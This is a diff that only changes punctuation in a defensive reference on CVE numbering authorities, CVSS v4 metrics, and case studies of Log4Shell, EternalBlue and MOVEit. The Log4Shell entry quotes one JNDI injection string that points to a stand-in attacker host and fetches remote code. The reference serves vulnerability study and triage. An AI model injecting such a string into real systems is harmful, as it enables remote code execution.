@@ -38,7 +38,7 @@ researchers to reference the same vulnerability unambiguously.
 ### CNA Hierarchy
 The CVE Numbering Authority (CNA) ecosystem is a federated hierarchy:
 
-MITRE (Root CNA) -- ultimate authority; assigns CVEs when no other CNA
+MITRE (Root CNA): ultimate authority; assigns CVEs when no other CNA
 covers the scope; operates cve.mitre.org and the CVE Services API.
 
 Top-Level Root CNAs (TL-Root):
@@ -51,10 +51,10 @@ Top-Level Root CNAs (TL-Root):
 - Oracle: Oracle Database, Java SE/JDK, MySQL, WebLogic
 - Cisco: Cisco IOS, NX-OS, ASA, network hardware, Webex
 
-CNA-LR (CNA of Last Resort) -- MITRE fills gaps for products outside any
+CNA-LR (CNA of Last Resort). MITRE fills gaps for products outside any
 CNA scope: novel products, independent researchers, EOL software.
 
-Authorized Data Publishers (ADP) -- not CNAs; authorized to add enrichment
+Authorized Data Publishers (ADP): not CNAs; authorized to add enrichment
 to existing CVE records. CISA-ADP adds SSVC decision-point data and
 exploitation status; other ADPs add CPE/CVSS data.
 
@@ -232,16 +232,16 @@ Officially published by FIRST on November 1, 2023 (previewed June 2023 at the 35
 
 ### New and Changed Base Metrics
 
-Attack Requirements (AT) -- NEW: environmental prerequisites beyond attacker control
+Attack Requirements (AT), NEW: environmental prerequisites beyond attacker control
 - None (N): no special deployment conditions required
 - Present (P): specific config/deployment condition required
 
-User Interaction (UI) -- Expanded from binary:
+User Interaction (UI), expanded from binary:
 - None (N): no user involvement
 - Passive (P): user takes routine action (opens email, visits page)
 - Active (A): user must take deliberate non-routine action (open file, install package)
 
-Scope removed -- Replaced by two-system impact model:
+Scope removed, replaced by two-system impact model:
 
 | Metric | Description |
 |--------|-------------|
@@ -795,7 +795,7 @@ CWE: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
 Disclosed: December 9, 2021 | Exploited: Within hours
 
 Root cause: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
-embedded in any logged string -- HTTP User-Agent, username, API parameters.
+embedded in any logged string (HTTP User-Agent, username, API parameters).
 The JNDI lookup fetched and executed an attacker-controlled Java class.
 
 Detection:
@@ -823,7 +823,7 @@ Affected: Windows XP through Server 2016 (SMBv1)
 CVSS v2: 8.1 HIGH (practical severity ~10.0; wormable)
 CWE: CWE-119 (Improper Memory Restriction)
 Origin: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
-Patched: March 14, 2017 (MS17-010) -- one month before leak
+Patched: March 14, 2017 (MS17-010), one month before leak
 
 Root cause: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
 handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.
@@ -851,7 +851,7 @@ Exploited by: Cl0p (TA505) ransomware group, May-June 2023 as 0-day
 Technical: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
 LEMURLOOT webshell, exfiltrated all stored files. No authentication required.
 
-Impact: 2,500+ organizations -- US DOE/USDA, PBI Research (900,000 SSA records),
+Impact: 2,500+ organizations, including US DOE/USDA, PBI Research (900,000 SSA records),
 Zellis UK payroll (BBC/BA/Boots), universities, government agencies.
 
 Lesson: Silent 0-day exploitation for ~4 weeks before vendor awareness.
@@ -1084,7 +1084,7 @@ often 24-72 hours before NVD updates. Key signals:
     }]
 
 `Exploitation: active` in CISA-ADP data is an early warning signal equivalent to
-KEV membership -- often appears before formal KEV catalog addition.
+KEV membership. It often appears before formal KEV catalog addition.
 
 ---
 
